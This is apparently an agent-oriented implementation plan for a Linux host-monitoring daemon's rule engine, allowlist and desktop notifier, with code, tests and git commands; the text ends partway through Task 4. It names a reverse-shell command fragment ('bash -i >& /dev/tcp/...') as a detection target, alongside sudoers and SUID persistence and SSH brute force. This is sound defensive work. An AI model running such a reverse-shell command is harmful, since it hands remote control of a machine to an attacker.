# Rule Engine + Allowlist + Notifier + Starter Rule Pack — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use `superpowers:subagent-driven-development` (recommended) or `superpowers:executing-plans` to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Turn `inspectord` from a telemetry collector into an active monitor. After this plan, a real reverse-shell command (e.g. `bash -i >& /dev/tcp/...`) traced by the process_collector — or, for v1 since we don't have that collector yet, a synthetic injected process event — fires a rule, produces an `Alert` row in DuckDB, and pops up on the user's desktop via `notify-send`. The user runs `inspectorctl alerts list` and sees what fired.

**Architecture:** A new `rule_engine` worker subscribes to the router. For every `Event` it runs through the registered rule set (YAML correlation rules + Python plugin rules; Sigma is deferred). Matching rules produce `Alert` candidates that are funneled through the **allowlist** (a file-based YAML loader with scoped-match evaluation: rule_id / entity / user_id / path_glob). Non-suppressed candidates run through the **dedup engine** (a sliding-window key→count map keyed on `<rule_id>:<primary_entity>`) — same key inside the window updates the existing alert's `dedup_count`; new key opens a fresh alert. Persisted alerts are then handed to the `notifier` worker which dispatches per severity routing — Phase 1 ships the **Desktop** sink only (`notify-send` via libnotify), with the matrix in place so Telegram/Signal can plug in later.

**Tech Stack:** Python 3.12 · Pydantic v2 · DuckDB · PyYAML (already in deps from log_tailer plan) · `notify-send` subprocess (libnotify; present on every Linux desktop) · existing supervisor + router + journal + IPC + Worker base class.

**Scope discipline:**
- Sigma rules deferred — `pySigma` adds heavy compile-to-backend machinery and we don't need it yet. YAML correlation + Python plugins cover v1.
- Incident auto-grouping deferred — alerts get dedup but stay as individual rows; the Incidents UI lands with the dashboard.
- Pending-actions menu (§9.5) deferred — alerts land as `new` and the user moves them through `acknowledged → resolved` manually via CLI/IPC.
- Tuning-suggestions (§9.6) deferred — needs more alert history to be useful.
- Telegram/Signal notifier sinks deferred — they require the secret-management subsystem (libsecret/systemd creds, spec §18.4) which arrives separately.
- Web dashboard deferred — it's the final Phase 1 plan after this one.

---

## Repository state at the start

`/home/eli/Development/inspectord` on `main` after PR #43. 183 tests passing. CI green. Existing pieces this plan builds on:

- `inspectord/schemas/event.py` — `Event` model (the input).
- `inspectord/schemas/alert.py` — `Alert`, `AlertStatus`, `RuleRef`, `EntityRef`, `RenderedAlert`. **Already defined; we'll use as-is.**
- `inspectord/schemas/allowlist.py` — `AllowlistEntry`, `AllowlistScope`, `AllowlistStats`. **Already defined; we just need the file loader + evaluator.**
- `inspectord/supervisor.py` — spawns workers, enriches events, publishes to router. Workers subscribe to router via `EventRouter.subscribe`.
- `inspectord/router.py` — `EventRouter` with `subscribe(name, queue_size, drop_policy, filter_fn)` returning a `Subscription` with `get_nowait()`.
- `inspectord/storage/db.py`, `inspectord/storage/migrations.py` — last migration is `0002_deps.sql`.
- `inspectord/ipc_server.py`, `inspectorctl/cli/app.py`, `inspectorctl/ipc_client.py` — patterns for new IPC methods and CLI subapps (see existing `deps`, `events`).
- `inspectord/workers/contract.py` — `Worker` base class.
- `inspectord/ids.py` — `uuid7()`.
- PyYAML already in deps (from log_tailer plan #33).

## File structure produced by this plan

```
inspectord/
├── rules/
│   ├── __init__.py
│   ├── base.py                          # Rule Protocol + Match dataclass + EvalContext
│   ├── yaml_loader.py                   # YAML correlation rule loader + evaluator
│   ├── python_loader.py                 # Discovers Python plugin rules
│   ├── registry.py                      # Builds the union rule set
│   └── starter_pack/                    # Ships in wheel
│       ├── __init__.py
│       ├── lolbin_reverse_shell.py      # Python plugin: bash -i >& /dev/tcp/...
│       ├── persistence_sudoers.yaml     # YAML: sudoers/sudoers.d FIM modification
│       ├── persistence_new_suid.yaml    # YAML: FIM file_created with setuid=true
│       └── ssh_brute_force.py           # Python plugin: 5x ssh_login_failed in 60s
├── allowlist/
│   ├── __init__.py
│   ├── file_loader.py                   # Loads /etc/inspectord/allowlist.yaml
│   └── evaluator.py                     # Scope-based suppression check
├── alerts/
│   ├── __init__.py
│   ├── builder.py                       # Event + rule match → Alert candidate
│   ├── dedup.py                         # Dedup window + Alert persistence
│   └── lifecycle.py                     # Status transitions (new→ack→resolved→suppressed)
├── workers/
│   ├── rule_engine/
│   │   ├── __init__.py
│   │   └── __main__.py                  # RuleEngineWorker
│   └── notifier/
│       ├── __init__.py
│       ├── __main__.py                  # NotifierWorker
│       └── sinks/
│           ├── __init__.py
│           └── desktop.py               # notify-send wrapper
└── (modified)
    ├── supervisor.py                    # router subscriptions for rule_engine + notifier IPC channel
    ├── config.py                        # add rule_engine + notifier workers
    ├── __main__.py                      # add IPC methods (list_alerts, ack_alert, ...)
    └── storage/migrations_data/
        └── 0003_alerts.sql

inspectorctl/cli/
└── alerts.py                            # list / show / ack / resolve / suppress

packaging/
└── allowlist.example.yaml               # example allowlist file shipped at /etc/inspectord/

tests/
├── rules/
│   ├── __init__.py
│   ├── test_base.py
│   ├── test_yaml_loader.py
│   ├── test_python_loader.py
│   ├── test_registry.py
│   └── starter_pack/
│       ├── __init__.py
│       ├── test_lolbin_reverse_shell.py
│       ├── test_persistence_sudoers.py
│       ├── test_persistence_new_suid.py
│       └── test_ssh_brute_force.py
├── allowlist/
│   ├── __init__.py
│   ├── test_file_loader.py
│   └── test_evaluator.py
├── alerts/
│   ├── __init__.py
│   ├── test_builder.py
│   ├── test_dedup.py
│   └── test_lifecycle.py
├── test_rule_engine_worker.py
├── test_notifier_worker.py
├── test_notifier_desktop_sink.py
├── test_cli_alerts.py
├── test_ipc_alerts.py
└── integration/
    └── test_alerts_e2e.py
```

Total new: ~17 source modules, ~16 test modules, 1 SQL migration, 4 starter-pack rules, 1 example allowlist YAML. **Approximately 14 task units** bundled into ~10 PRs.

## Workflow

Same as Phase 0 / dep_manager / log_tailer plans. Branch + PR per logical unit, TDD throughout, CI must pass, squash-merge after green. Bundle small adjacent units at the controller's discretion during execution.

---

## Task 1: Migration 0003 — alerts, rule_stats, rule_dryrun_log tables

**Files:**
- Create: `inspectord/storage/migrations_data/0003_alerts.sql`
- Create: `tests/test_alerts_migration.py`

**Branch:** `task-rules-01-migration`

- [ ] **Step 1: Failing test**

Write `tests/test_alerts_migration.py`:

```python
"""Tests for migration 0003 — alerts, rule_stats, rule_dryrun_log."""

from __future__ import annotations

from pathlib import Path

from inspectord.storage.db import Database
from inspectord.storage.migrations import current_schema_version, run_migrations


def test_migration_creates_alert_tables(tmp_path: Path) -> None:
    db = Database(tmp_path / "t.duckdb")
    db.connect()
    run_migrations(db)
    assert current_schema_version(db) >= 3
    tables = {
        r[0]
        for r in db.query(
            "SELECT table_name FROM information_schema.tables WHERE table_schema = 'main'"
        ).fetchall()
    }
    for needed in {"alerts", "rule_stats", "rule_dryrun_log"}:
        assert needed in tables, f"missing table {needed}"
    db.close()


def test_alerts_columns(tmp_path: Path) -> None:
    db = Database(tmp_path / "t.duckdb")
    db.connect()
    run_migrations(db)
    cols = {
        r[0]
        for r in db.query(
            "SELECT column_name FROM information_schema.columns WHERE table_name = 'alerts'"
        ).fetchall()
    }
    expected = {
        "alert_id",
        "rule_id",
        "ts",
        "severity",
        "status",
        "category",
        "dedup_key",
        "dedup_count",
        "first_seen_at",
        "last_seen_at",
        "rendered_short",
        "rendered_detail",
        "payload_json",
    }
    assert expected.issubset(cols)
    db.close()


def test_rule_stats_columns(tmp_path: Path) -> None:
    db = Database(tmp_path / "t.duckdb")
    db.connect()
    run_migrations(db)
    cols = {
        r[0]
        for r in db.query(
            "SELECT column_name FROM information_schema.columns WHERE table_name = 'rule_stats'"
        ).fetchall()
    }
    expected = {
        "rule_id",
        "fire_count",
        "last_fired_at",
        "dryrun_count",
        "suppressed_count",
        "updated_at",
    }
    assert expected.issubset(cols)
    db.close()
```

- [ ] **Step 2: Confirm failure**

```bash
cd /home/eli/Development/inspectord
source .venv/bin/activate
pytest tests/test_alerts_migration.py -v
```

Expected: FAIL — `missing table alerts`.

- [ ] **Step 3: Write the migration SQL**

Write `inspectord/storage/migrations_data/0003_alerts.sql`:

```sql
-- Migration 0003 — alerts, rule_stats, rule_dryrun_log (spec §10.1).
-- Additive; never destructive.

CREATE TABLE IF NOT EXISTS alerts (
    alert_id          VARCHAR PRIMARY KEY,
    rule_id           VARCHAR NOT NULL,
    ts                TIMESTAMP NOT NULL,
    severity          VARCHAR NOT NULL,
    status            VARCHAR NOT NULL DEFAULT 'new',
    category          VARCHAR NOT NULL,
    dedup_key         VARCHAR NOT NULL,
    dedup_count       INTEGER NOT NULL DEFAULT 1,
    first_seen_at     TIMESTAMP NOT NULL,
    last_seen_at      TIMESTAMP NOT NULL,
    rendered_short    VARCHAR NOT NULL,
    rendered_detail   VARCHAR NOT NULL,
    payload_json      VARCHAR NOT NULL
);

CREATE INDEX IF NOT EXISTS alerts_status_idx       ON alerts (status, ts);
CREATE INDEX IF NOT EXISTS alerts_rule_idx         ON alerts (rule_id, ts);
CREATE INDEX IF NOT EXISTS alerts_dedup_idx        ON alerts (dedup_key, last_seen_at);
CREATE INDEX IF NOT EXISTS alerts_severity_idx     ON alerts (severity, ts);

CREATE TABLE IF NOT EXISTS rule_stats (
    rule_id           VARCHAR PRIMARY KEY,
    fire_count        BIGINT NOT NULL DEFAULT 0,
    last_fired_at     TIMESTAMP,
    dryrun_count      BIGINT NOT NULL DEFAULT 0,
    suppressed_count  BIGINT NOT NULL DEFAULT 0,
    updated_at        TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS rule_dryrun_log (
    ts                TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    rule_id           VARCHAR NOT NULL,
    event_id          VARCHAR NOT NULL,
    detail            VARCHAR
);

CREATE INDEX IF NOT EXISTS rule_dryrun_log_rule_idx ON rule_dryrun_log (rule_id, ts);
```

- [ ] **Step 4: Confirm pass + lint**

```bash
pytest tests/test_alerts_migration.py -v
pytest tests/ -v
ruff check inspectord inspectorctl tests
ruff format --check inspectord inspectorctl tests
mypy inspectord inspectorctl
```

Expected: 3 new tests pass; total goes from 183 to 186.

- [ ] **Step 5: Branch + commit + push + PR**

```bash
git checkout main && git pull origin main
git checkout -b task-rules-01-migration
git add inspectord/storage/migrations_data/0003_alerts.sql tests/test_alerts_migration.py
git commit -m "feat(storage): migration 0003 — alerts + rule_stats + rule_dryrun_log"
git push -u origin task-rules-01-migration
gh pr create --base main --head task-rules-01-migration \
  --title "feat(storage): migration 0003 — alert tables" \
  --body "Adds alerts (primary alert store), rule_stats (per-rule fire/dryrun/suppressed counters), and rule_dryrun_log (dry-run match log for rule development). Schema follows spec §10.1."
```

Wait for CI green; do NOT merge — main thread handles merges.

---

## Task 2: Rule Protocol + EvalContext + Match dataclass

**Files:**
- Create: `inspectord/rules/__init__.py`
- Create: `inspectord/rules/base.py`
- Create: `tests/rules/__init__.py`
- Create: `tests/rules/test_base.py`

**Branch:** `task-rules-02-base`

The rule framework. A `Rule` is a Protocol: it gets an `EvalContext` (the current event + a sliding-window history) and returns zero-or-more `Match` objects.

- [ ] **Step 1: Failing tests**

Write `tests/rules/__init__.py`:

```python
```

Write `tests/rules/test_base.py`:

```python
"""Tests for the rule framework."""

from __future__ import annotations

from datetime import UTC, datetime

from inspectord.parsers.base import build_event
from inspectord.rules.base import EvalContext, Match, Rule


def _event(action: str = "test") -> object:
    return build_event(
        module="log_tailer",
        action=action,
        category=["host"],
        type_=["info"],
        severity="info",
    )


def test_match_dataclass() -> None:
    m = Match(
        rule_id="x.y",
        severity="medium",
        category="test",
        dedup_key="x.y:foo",
        primary_entity_kind="process",
        primary_entity_key="pid:1234",
        short="short msg",
        detail="detail msg",
    )
    assert m.rule_id == "x.y"
    assert m.severity == "medium"


def test_eval_context_carries_event_and_history() -> None:
    ctx = EvalContext(event=_event(), history=[_event("a"), _event("b")])
    assert len(ctx.history) == 2
    assert ctx.event.action == "test"


def test_eval_context_recent_filter() -> None:
    older = _event("old")
    older = older.model_copy(update={"ts": datetime(2020, 1, 1, tzinfo=UTC)})
    newer = _event("new")
    ctx = EvalContext(event=newer, history=[older, newer])
    recent = ctx.recent_events(window_s=60.0)
    # newer is "current"; older is from 2020 (way outside any 60s window)
    assert newer in recent
    assert older not in recent


class _AlwaysFireRule:
    rule_id = "test.always"
    severity = "info"
    category = "test"

    def evaluate(self, ctx: EvalContext) -> list[Match]:
        return [
            Match(
                rule_id=self.rule_id,
                severity=self.severity,
                category=self.category,
                dedup_key=f"{self.rule_id}:{ctx.event.action}",
                primary_entity_kind="event",
                primary_entity_key=ctx.event.event_id,
                short=f"fired on {ctx.event.action}",
                detail="long-form detail",
            )
        ]


def test_protocol_compatible_class() -> None:
    rule: Rule = _AlwaysFireRule()  # mypy-level check that the Protocol is satisfied
    matches = rule.evaluate(EvalContext(event=_event(), history=[]))
    assert len(matches) == 1
    assert matches[0].rule_id == "test.always"
```

- [ ] **Step 2: Confirm failure**

```bash
pytest tests/rules/test_base.py -v
```

Expected: ImportError on `inspectord.rules.base`.

- [ ] **Step 3: Implement**

Write `inspectord/rules/__init__.py`:

```python
"""Rule engine framework (spec §8)."""
```

Write `inspectord/rules/base.py`:

```python
"""Rule framework primitives (spec §8).

A Rule is anything matching the ``Rule`` Protocol below. Rules consume an
``EvalContext`` (the current event plus a sliding-window history) and return
zero-or-more ``Match`` objects.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from datetime import timedelta
from typing import Protocol

from inspectord.schemas.event import Event


@dataclass
class Match:
    """A rule fired. The dedup engine and alert builder consume these."""

    rule_id: str
    severity: str
    category: str
    dedup_key: str
    primary_entity_kind: str
    primary_entity_key: str
    short: str
    detail: str
    rule_name: str = ""
    why: str = ""
    false_positives: list[str] = field(default_factory=list)
    triggering_event_ids: list[str] = field(default_factory=list)
    labels: list[str] = field(default_factory=list)


@dataclass
class EvalContext:
    event: Event
    history: list[Event] = field(default_factory=list)

    def recent_events(self, *, window_s: float) -> list[Event]:
        """Return history events within ``window_s`` seconds of self.event."""
        cutoff = self.event.ts - timedelta(seconds=window_s)
        return [e for e in self.history if e.ts >= cutoff]


class Rule(Protocol):
    rule_id: str
    severity: str
    category: str

    def evaluate(self, ctx: EvalContext) -> list[Match]: ...
```

- [ ] **Step 4: Confirm pass + lint**

```bash
pytest tests/rules/test_base.py -v
pytest tests/ -v
ruff check inspectord inspectorctl tests
ruff format --check inspectord inspectorctl tests
mypy inspectord inspectorctl
```

Expected: 4 new tests pass; total 190.

- [ ] **Step 5: Commit + PR**

```bash
git checkout main && git pull origin main
git checkout -b task-rules-02-base
git add inspectord/rules/__init__.py inspectord/rules/base.py tests/rules/__init__.py tests/rules/test_base.py
git commit -m "feat(rules): add Rule Protocol + Match + EvalContext"
git push -u origin task-rules-02-base
gh pr create --base main --head task-rules-02-base \
  --title "feat(rules): rule framework primitives" \
  --body "Adds Rule Protocol, Match dataclass, and EvalContext with a recent_events(window_s) helper. All future Python plugin rules and YAML rules ultimately produce Match objects."
```

---

## Task 3: YAML correlation rule loader + evaluator

**Files:**
- Create: `inspectord/rules/yaml_loader.py`
- Create: `tests/rules/test_yaml_loader.py`

**Branch:** `task-rules-03-yaml-loader`

YAML correlation rules let non-programmers write detections. The format (spec §8.2):

```yaml
version: 1.0.0
id: persistence.sudoers_modified
name: "sudoers file modified"
severity: high
category: persistence
why: "Modifying sudoers can grant attackers persistent root."
false_positives:
  - "You ran visudo deliberately."
detect:
  any_of:
    - event.module == "fim_watcher"
      AND event.action == "file_modified"
      AND file.path == "/etc/sudoers"
    - event.module == "fim_watcher"
      AND event.action == "file_modified"
      AND file.path STARTSWITH "/etc/sudoers.d/"
short: "sudoers modified: {file.path}"
detail: "FIM detected modification of {file.path}"
```

To keep v1 simple, we support a small expression grammar:
- Boolean: `AND`, `OR`, `NOT`
- Equality: `==`, `!=`
- Membership: `IN [a, b]`, `NOT IN [...]`
- String predicates: `STARTSWITH`, `ENDSWITH`, `CONTAINS`, `MATCHES <regex>`
- Field access: `event.module`, `event.action`, `event.severity`, `process.name`, `process.pid`, `file.path`, `user.name`, `source.ip` etc. (dotted into the Event's optional dicts)

`{field}` interpolation in `short` and `detail` substitutes the same dotted field syntax.

`detect.any_of: [expr1, expr2, ...]` fires if any expression matches the current event. (Time-window correlation is in the Python plugin path; YAML stays simple in v1.)

- [ ] **Step 1: Failing tests**

Write `tests/rules/test_yaml_loader.py`:

```python
"""Tests for YAML rule loader + evaluator."""

from __future__ import annotations

from datetime import UTC, datetime
from pathlib import Path

import pytest

from inspectord.parsers.base import build_event
from inspectord.rules.base import EvalContext, Match
from inspectord.rules.yaml_loader import (
    YamlRule,
    YamlRuleError,
    evaluate_yaml_rule,
    load_yaml_rule,
)


def test_load_minimal_yaml(tmp_path: Path) -> None:
    p = tmp_path / "r.yaml"
    p.write_text(
        """
version: 1.0.0
id: test.always
name: "Always fire"
severity: info
category: test
why: "test"
detect:
  any_of:
    - event.action == "tick"
short: "tick"
detail: "tick happened"
""".lstrip()
    )
    rule = load_yaml_rule(p)
    assert isinstance(rule, YamlRule)
    assert rule.rule_id == "test.always"
    assert rule.severity == "info"


def test_evaluate_simple_equality() -> None:
    rule = YamlRule(
        rule_id="x",
        name="x",
        severity="info",
        category="test",
        why="",
        false_positives=[],
        detect_any_of=['event.action == "tick"'],
        short_tpl="t",
        detail_tpl="d",
    )
    ev = build_event(
        module="m", action="tick", category=["c"], type_=["t"], severity="info"
    )
    matches = evaluate_yaml_rule(rule, EvalContext(event=ev, history=[]))
    assert len(matches) == 1
    assert isinstance(matches[0], Match)
    assert matches[0].rule_id == "x"


def test_evaluate_string_predicates() -> None:
    rule = YamlRule(
        rule_id="x",
        name="x",
        severity="info",
        category="test",
        why="",
        false_positives=[],
        detect_any_of=['file.path STARTSWITH "/etc/sudoers"'],
        short_tpl="m {file.path}",
        detail_tpl="d {file.path}",
    )
    ev = build_event(
        module="fim_watcher",
        action="file_modified",
        category=["file"],
        type_=["change"],
        severity="info",
        file={"path": "/etc/sudoers.d/extra"},
    )
    matches = evaluate_yaml_rule(rule, EvalContext(event=ev, history=[]))
    assert matches
    assert matches[0].short == "m /etc/sudoers.d/extra"


def test_no_match_returns_empty() -> None:
    rule = YamlRule(
        rule_id="x",
        name="x",
        severity="info",
        category="test",
        why="",
        false_positives=[],
        detect_any_of=['event.action == "ping"'],
        short_tpl="t",
        detail_tpl="d",
    )
    ev = build_event(module="m", action="pong", category=["c"], type_=["t"], severity="info")
    assert evaluate_yaml_rule(rule, EvalContext(event=ev, history=[])) == []


def test_and_combiner() -> None:
    rule = YamlRule(
        rule_id="x",
        name="x",
        severity="info",
        category="test",
        why="",
        false_positives=[],
        detect_any_of=[
            'event.module == "fim_watcher" AND event.action == "file_modified"',
        ],
        short_tpl="t",
        detail_tpl="d",
    )
    matching = build_event(
        module="fim_watcher",
        action="file_modified",
        category=["file"],
        type_=["change"],
        severity="info",
        file={"path": "/etc/x"},
    )
    nonmatching = build_event(
        module="fim_watcher",
        action="file_created",
        category=["file"],
        type_=["change"],
        severity="info",
        file={"path": "/etc/x"},
    )
    assert evaluate_yaml_rule(rule, EvalContext(event=matching, history=[]))
    assert evaluate_yaml_rule(rule, EvalContext(event=nonmatching, history=[])) == []


def test_invalid_yaml_raises(tmp_path: Path) -> None:
    p = tmp_path / "bad.yaml"
    p.write_text("name: : :")
    with pytest.raises(YamlRuleError):
        load_yaml_rule(p)


def test_missing_required_field_raises(tmp_path: Path) -> None:
    p = tmp_path / "bad.yaml"
    p.write_text("version: 1.0.0\nid: x\n")
    with pytest.raises(YamlRuleError):
        load_yaml_rule(p)
```

- [ ] **Step 2: Confirm failure**

```bash
pytest tests/rules/test_yaml_loader.py -v
```

Expected: ImportError.

- [ ] **Step 3: Implement**

Write `inspectord/rules/yaml_loader.py`:

```python
"""YAML correlation-rule loader + evaluator (spec §8.2)."""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

import yaml

from inspectord.rules.base import EvalContext, Match
from inspectord.schemas.event import Event


class YamlRuleError(RuntimeError):
    pass


@dataclass
class YamlRule:
    rule_id: str
    name: str
    severity: str
    category: str
    why: str
    false_positives: list[str]
    detect_any_of: list[str]
    short_tpl: str
    detail_tpl: str
    version: str = "1.0.0"
    labels: list[str] = field(default_factory=list)


_FIELD_RE = re.compile(r"\{([a-zA-Z_][a-zA-Z0-9_.]*)\}")


def load_yaml_rule(path: Path) -> YamlRule:
    try:
        text = Path(path).read_text(encoding="utf-8")
    except FileNotFoundError as exc:
        raise YamlRuleError(f"rule not found: {path}") from exc
    try:
        data = yaml.safe_load(text)
    except yaml.YAMLError as exc:
        raise YamlRuleError(f"{path}: invalid YAML: {exc}") from exc
    if not isinstance(data, dict):
        raise YamlRuleError(f"{path}: top-level YAML must be a mapping")
    return load_yaml_rule_from_dict(data, source=str(path))


def load_yaml_rule_from_dict(data: dict[str, Any], *, source: str = "<inline>") -> YamlRule:
    required = ("id", "name", "severity", "category", "detect", "short", "detail")
    for key in required:
        if key not in data:
            raise YamlRuleError(f"{source}: missing required field '{key}'")
    detect = data.get("detect") or {}
    if not isinstance(detect, dict) or "any_of" not in detect:
        raise YamlRuleError(f"{source}: detect must be a mapping with 'any_of'")
    any_of_raw = detect["any_of"]
    if not isinstance(any_of_raw, list) or not all(isinstance(e, str) for e in any_of_raw):
        raise YamlRuleError(f"{source}: detect.any_of must be a list of strings")
    return YamlRule(
        version=str(data.get("version", "1.0.0")),
        rule_id=str(data["id"]),
        name=str(data["name"]),
        severity=str(data["severity"]),
        category=str(data["category"]),
        why=str(data.get("why", "")),
        false_positives=list(data.get("false_positives") or []),
        detect_any_of=list(any_of_raw),
        short_tpl=str(data["short"]),
        detail_tpl=str(data["detail"]),
        labels=list(data.get("labels") or []),
    )


def evaluate_yaml_rule(rule: YamlRule, ctx: EvalContext) -> list[Match]:
    for expr in rule.detect_any_of:
        if _eval_expr(expr, ctx.event):
            short = _interpolate(rule.short_tpl, ctx.event)
            detail = _interpolate(rule.detail_tpl, ctx.event)
            primary_kind, primary_key = _primary_entity_for(ctx.event)
            return [
                Match(
                    rule_id=rule.rule_id,
                    severity=rule.severity,
                    category=rule.category,
                    dedup_key=f"{rule.rule_id}:{primary_kind}:{primary_key}",
                    primary_entity_kind=primary_kind,
                    primary_entity_key=primary_key,
                    short=short,
                    detail=detail,
                    rule_name=rule.name,
                    why=rule.why,
                    false_positives=rule.false_positives,
                    triggering_event_ids=[ctx.event.event_id],
                    labels=list(rule.labels),
                )
            ]
    return []


# --- Expression evaluation. -------------------------------------------------

# Tiny grammar: AND / OR / NOT combinations of leaf predicates. Leaves are:
#   <path> <op> <literal>
#   <path> IN [<lit>, <lit>, ...]
#   <path> NOT IN [...]
#   <path> STARTSWITH <str>
#   <path> ENDSWITH <str>
#   <path> CONTAINS <str>
#   <path> MATCHES <regex>
# Literals: double-quoted string, single-quoted string, integer.

_LEAF_OP = re.compile(
    r"""
    ^\s*
    (?P<path>[a-zA-Z_][a-zA-Z0-9_.]*)
    \s+
    (?P<op>==|!=|IN|NOT\s+IN|STARTSWITH|ENDSWITH|CONTAINS|MATCHES)
    \s+
    (?P<rhs>.+?)
    \s*$
    """,
    re.VERBOSE,
)
_BOOL_TOKEN_RE = re.compile(r"\bAND\b|\bOR\b|\bNOT\b")


def _eval_expr(expr: str, event: Event) -> bool:
    return _eval_tokens(_tokenize(expr), event)


def _tokenize(expr: str) -> list[str]:
    """Split on top-level AND/OR/NOT keeping parens unsupported (v1 keeps it flat)."""
    parts: list[str] = []
    last = 0
    for m in _BOOL_TOKEN_RE.finditer(expr):
        if m.start() > last:
            parts.append(expr[last : m.start()].strip())
        parts.append(m.group(0))
        last = m.end()
    if last < len(expr):
        parts.append(expr[last:].strip())
    return [p for p in parts if p]


def _eval_tokens(tokens: list[str], event: Event) -> bool:
    """Left-to-right with NOT binding tightest. v1: no parentheses."""
    # First pass: resolve NOT tokens by attaching to next operand.
    resolved: list[bool | str] = []
    i = 0
    while i < len(tokens):
        tok = tokens[i]
        if tok == "NOT":
            if i + 1 >= len(tokens):
                return False
            value = _eval_leaf(tokens[i + 1], event)
            resolved.append(not value)
            i += 2
        elif tok in ("AND", "OR"):
            resolved.append(tok)
            i += 1
        else:
            resolved.append(_eval_leaf(tok, event))
            i += 1
    # Second pass: AND has higher precedence than OR. Fold ANDs first.
    out_or: list[bool] = []
    cur_and = True
    has_first = False
    j = 0
    while j < len(resolved):
        tok = resolved[j]
        if isinstance(tok, bool):
            if has_first:
                cur_and = cur_and and tok
            else:
                cur_and = tok
                has_first = True
            j += 1
        elif tok == "AND":
            j += 1
        elif tok == "OR":
            out_or.append(cur_and)
            cur_and = True
            has_first = False
            j += 1
        else:
            j += 1
    if has_first:
        out_or.append(cur_and)
    return any(out_or)


def _eval_leaf(leaf: str, event: Event) -> bool:
    m = _LEAF_OP.match(leaf)
    if m is None:
        return False
    path = m.group("path")
    op = re.sub(r"\s+", " ", m.group("op"))
    rhs = m.group("rhs").strip()
    lhs = _resolve_path(path, event)
    if op == "==":
        return _coerce(lhs) == _parse_literal(rhs)
    if op == "!=":
        return _coerce(lhs) != _parse_literal(rhs)
    if op in ("IN", "NOT IN"):
        items = _parse_list(rhs)
        result = lhs in items
        return result if op == "IN" else not result
    if op == "STARTSWITH" and isinstance(lhs, str):
        return lhs.startswith(_parse_literal(rhs))
    if op == "ENDSWITH" and isinstance(lhs, str):
        return lhs.endswith(_parse_literal(rhs))
    if op == "CONTAINS" and isinstance(lhs, str):
        return _parse_literal(rhs) in lhs
    if op == "MATCHES" and isinstance(lhs, str):
        return re.search(_parse_literal(rhs), lhs) is not None
    return False


def _resolve_path(path: str, event: Event) -> Any:
    parts = path.split(".")
    if not parts:
        return None
    head, *rest = parts
    if head == "event":
        # event.<attr> looks at the Event itself, then falls back to dict access
        if rest:
            val: Any = getattr(event, rest[0], None)
            for seg in rest[1:]:
                if isinstance(val, dict):
                    val = val.get(seg)
                else:
                    return None
            return _enum_value(val)
        return None
    # Otherwise, top-level optional dict on the Event (process, file, user, ...)
    block = getattr(event, head, None)
    if not isinstance(block, dict):
        return None
    val = block
    for seg in rest:
        if isinstance(val, dict):
            val = val.get(seg)
        else:
            return None
    return _enum_value(val)


def _enum_value(val: Any) -> Any:
    # If it's a Pydantic StrEnum (Severity, EventKind, Outcome) we want the string.
    if hasattr(val, "value") and not isinstance(val, (str, bytes, int, float, bool, dict, list)):
        try:
            return val.value
        except Exception:  # noqa: BLE001
            return val
    return val


def _coerce(val: Any) -> Any:
    return _enum_value(val)


def _parse_literal(raw: str) -> Any:
    raw = raw.strip()
    if raw.startswith('"') and raw.endswith('"'):
        return raw[1:-1]
    if raw.startswith("'") and raw.endswith("'"):
        return raw[1:-1]
    try:
        return int(raw)
    except ValueError:
        return raw


def _parse_list(raw: str) -> list[Any]:
    raw = raw.strip()
    if not (raw.startswith("[") and raw.endswith("]")):
        return []
    inner = raw[1:-1].strip()
    if not inner:
        return []
    return [_parse_literal(p.strip()) for p in inner.split(",")]


def _interpolate(tpl: str, event: Event) -> str:
    def replace(m: re.Match[str]) -> str:
        val = _resolve_path(m.group(1), event)
        return "" if val is None else str(val)

    return _FIELD_RE.sub(replace, tpl)


def _primary_entity_for(event: Event) -> tuple[str, str]:
    if event.process and "pid" in event.process:
        return "process", f"pid:{event.process['pid']}"
    if event.file and "path" in event.file:
        return "file", str(event.file["path"])
    if event.user and "name" in event.user:
        return "user", str(event.user["name"])
    if event.source and "ip" in event.source:
        return "ip", str(event.source["ip"])
    return "event", event.event_id
```

- [ ] **Step 4: Confirm pass + lint**

```bash
pytest tests/rules/test_yaml_loader.py -v
pytest tests/ -v
ruff check inspectord inspectorctl tests
ruff format --check inspectord inspectorctl tests
mypy inspectord inspectorctl
```

Expected: 7 new tests pass; total 197.

- [ ] **Step 5: Commit + PR**

```bash
git checkout main && git pull origin main
git checkout -b task-rules-03-yaml-loader
git add inspectord/rules/yaml_loader.py tests/rules/test_yaml_loader.py
git commit -m "feat(rules): YAML correlation rule loader + evaluator"
git push -u origin task-rules-03-yaml-loader
gh pr create --base main --head task-rules-03-yaml-loader \
  --title "feat(rules): YAML correlation rule loader" \
  --body "Loads YAML rules with a small AND/OR/NOT expression grammar over Event fields (event.*, process.*, file.*, user.*, source.* etc.). Supports ==/!= / IN / NOT IN / STARTSWITH / ENDSWITH / CONTAINS / MATCHES. Interpolates {field.path} into short/detail templates. detect.any_of fires if any expression matches the current event. Time-window correlation is in the Python plugin path."
```

Wait for CI green; do NOT merge.

---

## Task 4: Python plugin loader + Registry

**Files:**
- Create: `inspectord/rules/python_loader.py`
- Create: `inspectord/rules/registry.py`
- Create: `tests/rules/test_python_loader.py`
- Create: `tests/rules/test_registry.py`

**Branch:** `task-rules-04-python-loader-registry`

`load_python_rules(package)` discovers every module under a given package; any module-level identifier with a `RULE` constant or any class instance matching the `Rule` Protocol is exported. The `Registry` builds the union of YAML rules + Python rules and exposes `evaluate(ctx) -> list[Match]`.

- [ ] **Step 1: Failing tests**

Write `tests/rules/test_python_loader.py`:

```python
"""Tests for the Python plugin rule loader."""

from __future__ import annotations

import sys
import textwrap
from pathlib import Path

from inspectord.rules.python_loader import load_python_rules


def test_load_rules_from_package(tmp_path: Path) -> None:
    pkg = tmp_path / "fakepkg"
    pkg.mkdir()
    (pkg / "__init__.py").write_text("")
    (pkg / "rule_one.py").write_text(textwrap.dedent("""
        from inspectord.rules.base import EvalContext, Match


        class _R:
            rule_id = "fake.one"
            severity = "info"
            category = "test"

            def evaluate(self, ctx: EvalContext) -> list[Match]:
                return []


        RULE = _R()
    """))
    sys.path.insert(0, str(tmp_path))
    try:
        rules = load_python_rules("fakepkg")
    finally:
        sys.path.remove(str(tmp_path))
        sys.modules.pop("fakepkg", None)
